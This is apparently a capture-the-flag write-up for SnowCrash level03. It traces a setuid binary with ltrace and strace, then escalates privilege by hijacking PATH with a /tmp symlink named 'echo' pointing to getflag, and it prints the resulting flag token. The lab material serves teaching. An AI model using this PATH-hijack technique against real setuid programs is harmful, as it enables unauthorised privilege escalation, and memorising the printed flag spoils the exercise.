## Level 03


## Clues

We have an executable, named level03.


Lets check his permission :

```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$
```

We can see that this executable have the 's' permission, that's not common.

After some research, we discover that this is actually the "setuid" bit, which tells the OS to execute the program with the userid of its owner.

So that mean that if we execute level03, it would execute it like we were flag03.

Lets see what that program outputs :

```
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ ./level03 lorem 42 things
Exploit me
level03@SnowCrash:~$
```

Only "Exploit me" is printed, even with arguments.

## Solution 

Since the program tell us to exploit it, we are going to exploit it, using the powerfull **strace** and **ltrace**.

strace is a program that show us every system calls that another program uses.

ltrace is the same, but show us every library calls of a program.

Both of those also show us the content of the parameter of the calls which is really helpfull.

Using ltrace on ./level03
```
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                 = 2003
geteuid()                                                                 = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```
There is only one line that is interesting, the "system" call, we see that this programm call echo to print out the "Exploit me"



Using strace on ./level03
```
execve("./level03", ["./level03"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
...
...
...
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff70c) = 2416
waitpid(2416, Exploit me
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 2416
```

Nothing interesting, but we see that this program use the "clone" syscall, which create another thread, lets see what those thread also do :

```
...
...
...
[pid  2430] execve("/usr/local/sbin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = -1 ENOENT (No such file or directory)
[pid  2430] execve("/usr/local/bin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = -1 ENOENT (No such file or directory)
[pid  2430] execve("/usr/sbin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = -1 ENOENT (No such file or directory)
[pid  2430] execve("/usr/bin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = -1 ENOENT (No such file or directory)
[pid  2430] execve("/sbin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = -1 ENOENT (No such file or directory)
[pid  2430] execve("/bin/echo", ["echo", "Exploit", "me"], [/* 18 vars */]) = 0
...
...
...

```

If you tried to wrote a shell, you would immediatly undurstand what's going on.

The program first execute ***echo "Exploit me"***, which is a library call.

When you type a command in a shell prompt, the shell will look for every path in your environnement, in order to find your command and execute it.

And that's exacly the same behavior, the shell tried every path, and found an occurence on /bin/echo, and succeeded.


**This mean that if we change the path of our environnement, it would change the behavior of the program, lets crack it !**

The strategy here is to create a symbolic link of "/bin/getflag" into echo.

And then give the path of that symbolic link in our environnement, which will be searched by the shell and be executed by the program ./level03.


We move to /tmp, because we cant touch any file in the home directory.
```
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ ln -s /bin/getflag echo
```

Then we give the path of /tmp in the env

```
level03@SnowCrash:~$ export PATH="/tmp/:$PATH"
level03@SnowCrash:~$ echo $PATH
/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$
```

If everything is correcly set, by calling ./level03, the program will try execute echo in every path of our environnement, and will execute ```/tmp/echo``` which is our symbolic link.


```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
```

And here we go, isn't that cool ?


## What i learned

Shell breach.

Reverse engineering (Using strace and ltrace).

Protection to code injection.